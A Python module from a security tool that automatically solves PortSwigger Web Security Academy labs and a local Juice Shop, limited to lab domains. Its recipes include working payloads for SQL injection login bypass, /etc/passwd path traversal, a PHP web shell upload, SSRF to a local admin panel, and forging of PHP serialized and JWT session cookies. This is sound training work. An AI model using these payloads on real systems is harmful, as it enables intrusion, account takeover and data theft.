"""Live lab recipes executed through NetCast3r's own typed tools.

The crawler is for an unknown target. A lab is a known target with a known
proof, so it gets a recipe: launch the instance, perform the minimum steps,
verify the lab's own banner, and record the lesson. Every step goes through the
same scoped MCP tools, so the run appears in Live Runs with the same scope
checks and audit trail as a hunt.

Recipes are deliberately small and explicit. A recipe that fails is a real
signal: either the target changed or a capability is missing. It never records
a solved lab without the Academy banner.
"""

from __future__ import annotations

import re
import threading
import time
from concurrent.futures import ThreadPoolExecutor

from .agent_runtime import LocalPlane
from .events import Event
from .. import browser, training

LAB_SCOPE = [
    "portswigger.net", "*.portswigger.net",
    "web-security-academy.net", "*.web-security-academy.net",
    "exploit-server.net", "*.exploit-server.net",
]

RECIPES = {
    "lab-retrieve-hidden-data": {
        "page": "https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data",
        "title": "SQL injection in a WHERE clause",
        "steps": [
            {"kind": "http", "method": "GET",
             "path": "/filter?category=Gifts%27%20OR%201%3D1--",
             "expect": {"status": 200, "contains": "View details"}},
            {"kind": "verify"},
            {"kind": "record",
             "technique": "In-band boolean SQL injection in a string context",
             "lesson": "The category filter interpolated the value into a single-quoted SQL string. Breaking out with a quote and adding OR 1=1-- removed the released predicate and returned hidden products. A boolean change in the result set is enough to prove injection; no UNION or data dump was needed."},
        ],
    },
    "lab-unprotected-admin-functionality": {
        "page": "https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality",
        "title": "Unprotected admin functionality",
        "steps": [
            {"kind": "http", "method": "GET", "path": "/robots.txt",
             "expect": {"status": 200, "contains": "administrator-panel"}},
            {"kind": "http", "method": "GET",
             "path": "/administrator-panel/delete?username=carlos",
             "expect": {"status": 302}},
            {"kind": "verify"},
            {"kind": "record",
             "technique": "Missing function-level authorization on an admin panel",
             "lesson": "robots.txt disclosed /administrator-panel, and the panel enforced no server-side role check. An anonymous request saw the user list and could delete carlos. Obscuring a path is not access control; every admin route must verify the session's role on the server."},
        ],
    },
    "lab-graphql-reading-private-posts": {
        "page": "https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts",
        "title": "Accessing private GraphQL posts",
        "steps": [
            {"kind": "http", "method": "POST", "path": "/graphql/v1",
             "json": {"query": "{getBlogPost(id:3){id title isPrivate postPassword}}"},
             "capture": {"password": "\"postPassword\"\\s*:\\s*\"([^\"]+)\""},
             "expect": {"status": 200, "contains": "postPassword"}},
            {"kind": "submit", "answer": "{{password}}",
             "expect": {"contains": "\"correct\":true"}},
            {"kind": "verify"},
            {"kind": "record",
             "technique": "GraphQL hidden field disclosure",
             "lesson": "The GraphQL endpoint exposed an undocumented postPassword field on the BlogPost type. Querying the private post by id returned the password even though the UI never showed it. Introspect the schema, request every field on a hidden object, then use the disclosed value to prove access."},
        ],
    },
    "lab-deserialization-modifying-serialized-objects": {
        "page": "https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects",
        "title": "Modifying serialized objects",
        "steps": [
            {"kind": "login", "username": "wiener", "password": "peter"},
            {"kind": "php_serial_tamper", "field": "admin"},
            {"kind": "http", "method": "GET", "path": "/admin",
             "expect": {"status": 200, "contains": "Users"}},
            {"kind": "http", "method": "GET",
             "path": "/admin/delete?username=carlos",
             "expect": {"status": 302}},
            {"kind": "verify"},
            {"kind": "record",
             "technique": "PHP object injection through a client-controlled serialized session",
             "lesson": "The session cookie was base64 PHP serialized User data. Decoding it showed admin as b:0; flipping the boolean to b:1 while preserving the serialized length produced an admin session that reached /admin and deleted carlos. When a cookie is a serialized object, decode it before trusting the UI's role checks."},
        ],
    },
    "juice-login-sqli": {
        "base": "http://127.0.0.1:3000",
        "page": "http://127.0.0.1:3000/#/login",
        "title": "Juice Shop login SQL injection",
        "steps": [
            {"kind": "http", "method": "POST", "path": "/rest/user/login",
             "json": {"email": "' OR 1=1--", "password": "x"},
             "capture": {"token": "\"token\":\"([^\"]+)\""},
             "expect": {"status": 200}},
            {"kind": "jwt_claim", "token": "{{token}}", "claim": "role",
             "expect": "admin"},
            {"kind": "record",
             "evidence": "The Juice Shop login API returned an administrator token for the email payload ' OR 1=1--; /rest/user/whoami confirmed the admin role.",
             "technique": "SQL injection authentication bypass",
             "lesson": "The Juice Shop login query concatenated the email value into a SQL string. The payload ' OR 1=1-- returned the first user, the administrator, and the token worked on /rest/user/whoami. Verify a bypass with an authenticated identity check, not only a 200 response."},
        ],
    },
    "lab-user-id-controlled-by-request-parameter": {
        "page": "https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter",
        "title": "User ID controlled by request parameter",
        "steps": [
            {"kind": "login", "username": "wiener", "password": "peter"},
            {"kind": "http", "method": "GET", "path": "/my-account?id=carlos",
             "capture": {"apikey": "API [Kk]ey is:\\s*([A-Za-z0-9]+)"},
             "expect": {"status": 200, "contains": "carlos"}},
            {"kind": "submit", "answer": "{{apikey}}",
             "expect": {"contains": "\"correct\":true"}},
            {"kind": "verify"},
            {"kind": "record",
             "technique": "Horizontal IDOR through a request parameter",
             "lesson": "The account page selected the user from the id query parameter without checking ownership. Changing id from wiener to carlos returned Carlos's API key, and submitting that key solved the lab. Always compare the same route from two owned accounts, then use a field the other account should not see as proof."},
        ],
    },
    "lab-user-role-controlled-by-request-parameter": {
        "page": "https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter",
        "title": "User role controlled by request parameter",
        "steps": [
            {"kind": "login", "username": "wiener", "password": "peter"},
            {"kind": "cookie_set", "name": "Admin", "value": "true"},
            {"kind": "http", "method": "GET", "path": "/admin",
             "expect": {"status": 200, "contains": "carlos"}},
            {"kind": "http", "method": "GET",
             "path": "/admin/delete?username=carlos",
             "expect": {"status": 302}},
            {"kind": "verify"},
            {"kind": "record",
             "technique": "Client-controlled role cookie",
             "lesson": "The admin gate trusted an Admin cookie set by the client. Changing Admin=false to Admin=true reached /admin and deleted carlos. Authorization must be derived from the server-side session, never from a cookie value the user can edit."},
        ],
    },
    "lab-basic-ssrf-against-localhost": {
        "page": "https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost",
        "title": "Basic SSRF against the local server",
        "steps": [
            {"kind": "http", "method": "GET", "path": "/product?productId=1",
             "expect": {"status": 200}},
            {"kind": "http", "method": "POST", "path": "/product/stock",
             "form": {"stockApi": "http://localhost/admin"},
             "expect": {"status": 200, "contains": "Users"}},
            {"kind": "http", "method": "POST", "path": "/product/stock",
             "form": {"stockApi": "http://localhost/admin/delete?username=carlos"},
             "expect": {"status": 302}},
            {"kind": "verify"},
            {"kind": "record",
             "technique": "Server-side request forgery to a local admin endpoint",
             "lesson": "The stock checker fetched the URL in stockApi server-side. Pointing it at http://localhost/admin reached the internal admin panel, and the delete path removed carlos. A server-side fetch must be treated as an internal request, not a client request."},
        ],
    },
    "file-path-traversal-lab-simple": {
        "page": "https://portswigger.net/web-security/file-path-traversal/lab-simple",
        "title": "File path traversal, simple case",
        "steps": [
            {"kind": "http", "method": "GET",
             "path": "/image?filename=../../../etc/passwd",
             "expect": {"status": 200, "contains": "root:x:0:0"}},
            {"kind": "verify"},
            {"kind": "record",
             "technique": "Path traversal in a file parameter",
             "lesson": "The filename parameter was passed to the filesystem without canonicalisation. Three parent segments reached /etc/passwd and the response contained root:x:0:0, which is the lab's proof. Normalise the resolved path and enforce a base directory; a blocklist of ../ is not enough."},
        ],
    },
    "lab-login-bypass": {
        "page": "https://portswigger.net/web-security/sql-injection/lab-login-bypass",
        "title": "SQL injection login bypass",
        "steps": [
            {"kind": "login", "username": "administrator'--", "password": "x"},
            {"kind": "http", "method": "GET", "path": "/my-account",
             "expect": {"status": 200, "contains": "administrator"}},
            {"kind": "verify"},
            {"kind": "record",
             "technique": "SQL injection authentication bypass",
             "lesson": "The login query concatenated the username into a single-quoted SQL string. Sending administrator'-- commented out the password predicate and authenticated the session as the administrator. Prove the bypass with a page that shows the administrator identity, not merely a redirect."},
        ],
    },
    "lab-file-upload-remote-code-execution-via-web-shell-upload": {
        "page": "https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload",
        "title": "Remote code execution via web shell upload",
        "steps": [
            {"kind": "login", "username": "wiener", "password": "peter"},
            {"kind": "http", "method": "GET", "path": "/my-account",
             "capture": {"csrf": "name=\"csrf\" value=\"([^\"]+)\""}},
            {"kind": "upload", "path": "/my-account/avatar", "field": "avatar",
             "filename": "exploit.php",
             "content": "<?php echo file_get_contents('/home/carlos/secret'); ?>",
             "content_type": "application/x-php",
             "form": {"user": "wiener", "csrf": "{{csrf}}"},
             "expect": {"status": 200}},
            {"kind": "http", "method": "GET", "path": "/files/avatars/exploit.php",
             "capture": {"secret": "^(.+)$"}, "expect": {"status": 200}},
            {"kind": "submit", "answer": "{{secret}}",
             "expect": {"contains": "\"correct\":true"}},
            {"kind": "verify"},
            {"kind": "record",
             "technique": "Unrestricted file upload to web shell execution",
             "lesson": "The avatar endpoint stored the uploaded filename and served it from /files/avatars/ without checking the extension or content type. A PHP webshell uploaded as multipart form data executed when fetched, returning Carlos's secret. The post-login CSRF token is session-bound, so it must come from the account page, not the login page."},
        ],
    },
    "lab-jwt-authentication-bypass-via-unverified-signature": {
        "page": "https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature",
        "title": "JWT authentication bypass via unverified signature",
        "steps": [
            {"kind": "login", "username": "wiener", "password": "peter"},
            {"kind": "jwt_tamper", "claim": "sub", "value": "administrator",
             "store": "cookie"},
            {"kind": "http", "method": "GET", "path": "/admin",
             "expect": {"status": 200, "contains": "admin"}},
            {"kind": "http", "method": "GET",
             "path": "/admin/delete?username=carlos",
             "expect": {"status": 302}},
            {"kind": "verify"},
            {"kind": "record",
             "technique": "JWT authentication bypass via an unverified signature",
             "lesson": "The session cookie was a signed JWT with payload {iss, exp, sub}. Changing sub to administrator and re-encoding the header and payload, while keeping the original signature, reached the admin panel and deleted carlos. The server decoded the claims but never verified the signature. Test a changed payload with the original signature before trying key confusion."},
        ],
    },
}


class LabRunner:
    def __init__(self, server, workers: int = 2):
        self.server = server
        self.pool = ThreadPoolExecutor(max_workers=max(1, workers),
                                       thread_name_prefix="netcast3r-lab")
        self._handles: dict[str, threading.Event] = {}
        self._lock = threading.Lock()

    def available(self) -> list[dict]:
        return [{"slug": slug, "title": recipe["title"],
                 "steps": len(recipe["steps"])}
                for slug, recipe in sorted(RECIPES.items())]

    def start(self, slug: str, mission_id: str = "") -> dict:
        slug = (slug or "").strip()
        if slug == "auto":
            planned = training.plan(self.server.index, limit=30)
            slug = next((item["slug"] for item in planned.get("items", [])
                         if item["slug"] in RECIPES), "")
            if not slug:
                progress = {row["lab_slug"]: row for row in
                            self.server.index.list_training(limit=1000)}
                slug = next((candidate for candidate in RECIPES
                             if (progress.get(candidate) or {}).get("status")
                             != "solved"), "")
            if not slug:
                # Every scripted lab is already solved; re-running one is a
                # useful regression check and still verifies before recording.
                slug = next(iter(RECIPES))
        recipe = RECIPES.get(slug)
        if not recipe:
            raise ValueError(f"no recipe for lab: {slug}")
        run = self.server.index.create_run(
            recipe["page"],
            {"mode": "lab", "slug": slug, "mission_id": mission_id})
        cancel = threading.Event()
        with self._lock:
            self._handles[run["id"]] = cancel
        self.pool.submit(self._run, run["id"], slug, recipe, mission_id, cancel)
        return run

    def start_all(self, mission_id: str = "") -> list[dict]:
        """Queue every scripted recipe once. The pool bounds the concurrency."""
        runs = []
        for slug in RECIPES:
            try:
                runs.append(self.start(slug, mission_id))
            except ValueError:
                continue
        return runs

    def cancel(self, run_id: str) -> bool:
        with self._lock:
            cancel = self._handles.get(run_id)
        if not cancel:
            return False
        cancel.set()
        return True

    def shutdown(self, wait: bool = False) -> None:
        with self._lock:
            for cancel in self._handles.values():
                cancel.set()
        self.pool.shutdown(wait=wait, cancel_futures=True)

    def _emit(self, run_id: str):
        def emit(event: Event) -> None:
            event.run_id = event.run_id or run_id
            self.server.bus.publish(event)
            try:
                self.server.index.add_event(run_id, event.to_dict())
            except Exception:  # noqa: BLE001 - the run must survive an event write
                pass
        return emit

    def _run(self, run_id: str, slug: str, recipe: dict, mission_id: str,
             cancel: threading.Event) -> None:
        emit = self._emit(run_id)
        self.server.index.update_run(run_id, status="running",
                                     started_at=_now())
        emit(Event(type="log", agent="lab", stage="launch",
                   payload={"text": f"recipe loaded: {recipe['title']}"}))
        try:
            summary = self._execute(slug, recipe, mission_id, emit, cancel)
            status = "done"
            error = ""
            if not summary.get("solved"):
                status = "failed"
                error = summary.get("error") or "the lab did not verify"
        except Exception as exc:  # noqa: BLE001 - a failed recipe is a real result
            summary = {"mode": "lab", "slug": slug,
                       "solved": False, "error": f"{type(exc).__name__}: {exc}"}
            status, error = "failed", summary["error"]
            emit(Event(type="error", agent="lab", level="error",
                       payload={"error": summary["error"]}))
        self.server.index.update_run(run_id, status=status, finished_at=_now(),
                                     counts_json=summary, error=error)
        with self._lock:
            self._handles.pop(run_id, None)
        emit(Event(type="run.state", stage="record", payload={"status": status}))
        if status == "done":
            emit(Event(type="run.finished", payload={"counts": summary}))

    def _call(self, registry, name: str, args: dict) -> dict:
        payload, is_error = registry.call(name, args, actor="agent:lab")
        if is_error:
            error = payload.get("error") or {}
            raise RuntimeError(f"{name}: {error.get('message') or 'refused'}")
        return payload

    @staticmethod
    def _sub(value, variables: dict):
        if isinstance(value, str):
            for key, item in variables.items():
                value = value.replace(f"{{{{{key}}}}}", str(item))
            return value
        if isinstance(value, dict):
            return {key: LabRunner._sub(item, variables) for key, item in value.items()}
        if isinstance(value, list):
            return [LabRunner._sub(item, variables) for item in value]
        return value

    def _browser_instance(self, page: str) -> str:
        """Launch a lab through the managed browser when cookies are stale."""
        state = browser.state("portswigger", base=self.server.base)
        if not state.get("running"):
            browser.launch("portswigger", page, base=self.server.base,
                           headless=False)
        else:
            browser.goto("portswigger", page, base=self.server.base)
        snap = browser.snapshot("portswigger", base=self.server.base)
        link = next((str(item.get("href") or "")
                     for item in snap.get("items") or []
                     if "/academy/labs/launch/" in str(item.get("href") or "")), "")
        if not link:
            raise RuntimeError(
                "could not find the launch link in HTTP or the managed browser")
        result = browser.goto("portswigger", link, base=self.server.base)
        return str(result.get("url") or "").rstrip("/")

    def _expect(self, payload: dict, expect: dict, step: str) -> None:
        if not expect:
            return
        status = int(payload.get("status") or 0)
        body = str(payload.get("body") or "")
        if "status" in expect and status != int(expect["status"]):
            raise RuntimeError(f"{step}: expected HTTP {expect['status']}, got {status}")
        if "contains" in expect and str(expect["contains"]) not in body:
            raise RuntimeError(f"{step}: response did not contain {expect['contains']!r}")
        if "not_contains" in expect and str(expect["not_contains"]) in body:
            raise RuntimeError(f"{step}: response contained {expect['not_contains']!r}")

    def _execute(self, slug: str, recipe: dict, mission_id: str, emit,
                 cancel) -> dict:
        from ..mcp.tools import ToolContext, ToolRegistry

        ctx = ToolContext(
            plane=LocalPlane(self.server), policy="supervised",
            base=self.server.base, actor="agent:lab", mission_id=mission_id)
        registry = ToolRegistry(ctx)
        scope = list(LAB_SCOPE)
        if recipe.get("base"):
            # A recipe that names its own origin (a local Juice Shop, say) must
            # be allowed to reach it when no mission supplies the scope.
            from urllib.parse import urlsplit as _urlsplit
            host = (_urlsplit(str(recipe["base"])).hostname or "").strip().lower()
            if host and host not in scope:
                scope.append(host)
        variables: dict[str, str] = {}
        http_calls = 0
        phase = {"stage": "launch"}

        def request(args: dict) -> dict:
            nonlocal http_calls
            if cancel.is_set():
                raise RuntimeError("cancelled")
            args = dict(args)
            args.setdefault("scope", scope)
            if mission_id:
                args["mission_id"] = mission_id
            if "target" in args:
                args["target"] = self._sub(args["target"], variables)
            for key in ("headers", "form", "json"):
                if key in args:
                    args[key] = self._sub(args[key], variables)
            payload = self._call(registry, "http_request", args)
            http_calls += 1
            emit(Event(type="fetch", agent="lab", stage=phase["stage"], payload={
                "url": payload.get("url") or args.get("target"),
                "status": payload.get("status")}))
            return payload

        page = recipe["page"]
        if recipe.get("base"):
            base = str(recipe["base"]).rstrip("/")
            emit(Event(type="log", agent="lab", stage=phase["stage"], payload={
                "text": f"using local range: {base}"}))
        else:
            emit(Event(type="log", agent="lab", stage=phase["stage"], payload={
                "text": f"launching {page}"}))
            page_response = request({
                "target": page, "method": "GET", "max_bytes": 131072,
                "follow_redirects": False, "auth_profile": "portswigger",
            })
            launch = re.search(r'href="(/academy/labs/launch/[^"]+)"',
                               str(page_response.get("body") or ""))
            if launch:
                launch_url = "https://portswigger.net" + launch.group(1)
                instance = request({
                    "target": launch_url, "method": "GET", "max_bytes": 131072,
                    "follow_redirects": True, "max_redirects": 5,
                    "auth_profile": "portswigger",
                })
                base = str(instance.get("url") or "").rstrip("/")
            else:
                # The cookie profile can be stale even when the managed browser is
                # still signed in. Fall back to the real browser session to launch.
                base = self._browser_instance(page)
            if ".web-security-academy.net" not in base:
                raise RuntimeError(f"launch did not reach a lab instance: {base}")
        variables["base"] = base
        emit(Event(type="log", agent="lab", stage=phase["stage"], payload={
            "text": f"lab instance ready: {base}"}))

        for index, step in enumerate(recipe["steps"], 1):
            if cancel.is_set():
                raise RuntimeError("cancelled")
            kind = step["kind"]
            phase["stage"] = ("identity" if kind == "login" else
                              "verify" if kind == "verify" else
                              "record" if kind == "record" else "test")
            emit(Event(type="log", agent="lab", stage=phase["stage"], payload={
                "text": f"step {index}/{len(recipe['steps'])}: {kind}"}))
            if kind == "login":
                login = request({
                    "target": base + "/login", "method": "GET",
                    "max_bytes": 131072, "follow_redirects": False,
                })
                csrf = re.search(r'name="csrf" value="([^"]+)"',
                                 str(login.get("body") or ""))
                session = next((item.split(";")[0]
                                for item in login.get("set_cookie") or []
                                if item.startswith("session=")
                                and len(item.split(";")[0]) > len("session=")), "")
                form = {"username": step["username"],
                        "password": step["password"]}
                if csrf:
                    form["csrf"] = csrf.group(1)
                posted = request({
                    "target": base + "/login", "method": "POST",
                    "form": form,
                    **({"headers": {"cookie": session}} if session else {}),
                    "max_bytes": 131072, "follow_redirects": False,
                })
                cookie = next((item.split(";")[0]
                               for item in posted.get("set_cookie") or []
                               if item.startswith("session=")), session)
                variables["cookie"] = cookie
                if posted.get("status") not in {302, 303}:
                    raise RuntimeError(f"login failed: HTTP {posted.get('status')}")
            elif kind == "http":
                path = step["path"]
                target = path if "://" in path else base + path
                args = {
                    "target": target, "method": step.get("method", "GET"),
                    "max_bytes": step.get("max_bytes", 131072),
                    "follow_redirects": False,
                }
                if variables.get("cookie") or step.get("headers"):
                    args["headers"] = dict(step.get("headers") or {})
                    if variables.get("cookie"):
                        args["headers"]["cookie"] = variables["cookie"]
                if step.get("form"):
                    args["form"] = self._sub(step["form"], variables)
                if step.get("json"):
                    args["json"] = self._sub(step["json"], variables)
                payload = request(args)
                self._expect(payload, step.get("expect") or {}, f"step {index}")
                for name, pattern in (step.get("capture") or {}).items():
                    match = re.search(pattern, str(payload.get("body") or ""),
                                      re.MULTILINE)
                    if not match:
                        raise RuntimeError(f"step {index}: capture {name} not found")
                    variables[name] = match.group(1)
            elif kind == "upload":
                args = {
                    "target": base + step["path"], "field": step["field"],
                    "filename": step["filename"], "content": step["content"],
                    "content_type": step.get("content_type"),
                    "form": self._sub(step.get("form") or {}, variables),
                    "max_bytes": 131072, "scope": scope,
                }
                if mission_id:
                    args["mission_id"] = mission_id
                if variables.get("cookie"):
                    args["headers"] = {"cookie": variables["cookie"]}
                payload = self._call(registry, "http_upload", args)
                self._expect(payload, step.get("expect") or {}, f"step {index}")
            elif kind == "cookie_set":
                current = variables.get("cookie") or ""
                parts = [part.strip() for part in current.split(";") if part.strip()]
                name = str(step["name"])
                parts = [part for part in parts
                         if part.split("=", 1)[0].strip() != name]
                parts.append(f"{name}={step['value']}")
                variables["cookie"] = "; ".join(parts)
            elif kind == "browser_check":
                profile = str(step.get("profile") or "juice")
                target = base + step["path"] if step["path"].startswith("/") else step["path"]
                state = browser.state(profile, base=self.server.base)
                if not state.get("running"):
                    browser.launch(profile, target, base=self.server.base,
                                   headless=False)
                else:
                    browser.goto(profile, target, base=self.server.base)
                snap = browser.snapshot(profile, base=self.server.base)
                text = str(snap.get("text") or "") + "\n" + str(snap.get("html") or "")
                if str(step["contains"]) not in text:
                    raise RuntimeError(
                        f"browser_check: {step['contains']!r} not found on {target}")
            elif kind == "php_serial_tamper":
                import base64
                import urllib.parse
                cookie = variables.get("cookie") or ""
                name, _, value = cookie.partition("=")
                raw = urllib.parse.unquote(value)
                pad = "=" * ((4 - len(raw) % 4) % 4)
                decoded = base64.b64decode(raw + pad).decode("latin1")
                marker = 's:5:"admin";b:0;'
                if marker not in decoded:
                    raise RuntimeError("php_serial_tamper: admin boolean not found")
                tampered = decoded.replace(marker, 's:5:"admin";b:1;', 1)
                encoded = urllib.parse.quote(
                    base64.b64encode(tampered.encode("latin1")).decode())
                variables["cookie"] = f"{name or 'session'}={encoded}"
            elif kind == "jwt_claim":
                import base64
                import json
                token = self._sub(step["token"], variables)
                parts = token.split(".")
                if len(parts) != 3:
                    raise RuntimeError("jwt_claim: value is not a JWT")
                pad = "=" * ((4 - len(parts[1]) % 4) % 4)
                payload = json.loads(base64.urlsafe_b64decode(parts[1] + pad))
                data = payload.get("data", payload)
                actual = data.get(step["claim"])
                if str(actual) != str(step["expect"]):
                    raise RuntimeError(
                        f"jwt_claim: {step['claim']}={actual!r}, expected {step['expect']!r}")
                variables["jwt_payload"] = json.dumps(data)
            elif kind == "jwt_tamper":
                cookie = variables.get("cookie") or ""
                token = cookie.split("=", 1)[1] if "=" in cookie else ""
                parts = token.split(".")
                if len(parts) != 3:
                    raise RuntimeError("jwt_tamper: session cookie is not a JWT")
                import base64
                import json
                def decode(part: str) -> dict:
                    pad = "=" * ((4 - len(part) % 4) % 4)
                    return json.loads(base64.urlsafe_b64decode(part + pad))
                def encode(obj: dict) -> str:
                    raw = json.dumps(obj, separators=(",", ":")).encode()
                    return base64.urlsafe_b64encode(raw).decode().rstrip("=")
                payload = decode(parts[1])
                payload[step["claim"]] = step["value"]
                variables[step.get("store") or "cookie"] = (
                    "session=" + encode(decode(parts[0])) + "." + encode(payload)
                    + "." + parts[2])
            elif kind == "submit":
                payload = request({
                    "target": base + "/submitSolution", "method": "POST",
                    "form": {"answer": self._sub(step["answer"], variables)},
                    "max_bytes": 32768,
                })
                self._expect(payload, step.get("expect") or {}, f"step {index}")
            elif kind == "verify":
                payload = self._call(registry, "training_verify",
                                     {"instance_url": base + "/"})
                variables["solved"] = "true" if payload.get("solved") else "false"
                variables["evidence"] = payload.get("evidence") or ""
                if not payload.get("solved"):
                    raise RuntimeError("verify: no solved banner")
            elif kind == "record":
                evidence = (self._sub(step.get("evidence") or "", variables)
                            or variables.get("evidence")
                            or "Academy banner verified.")
                payload = self._call(registry, "training_record", {
                    "lab_slug": slug,
                    "status": "solved",
                    "instance_url": base + "/",
                    "evidence": evidence,
                    "lesson": step["lesson"],
                    "technique": step.get("technique", ""),
                    "verified": True,
                    "mission_id": mission_id,
                })
                variables["lesson_id"] = str((payload.get("progress") or {}).get("lesson_id") or "")
                # A record is only reached after the recipe's assertions passed.
                variables["solved"] = "true"
            else:
                raise RuntimeError(f"unknown recipe step: {kind}")
        solved = variables.get("solved") == "true"
        return {
            "mode": "lab", "slug": slug,
            "title": recipe.get("title", ""), "instance": base,
            "solved": solved, "steps": len(recipe["steps"]),
            "http_calls": http_calls,
            "lesson_id": variables.get("lesson_id", ""),
        }


def _now() -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
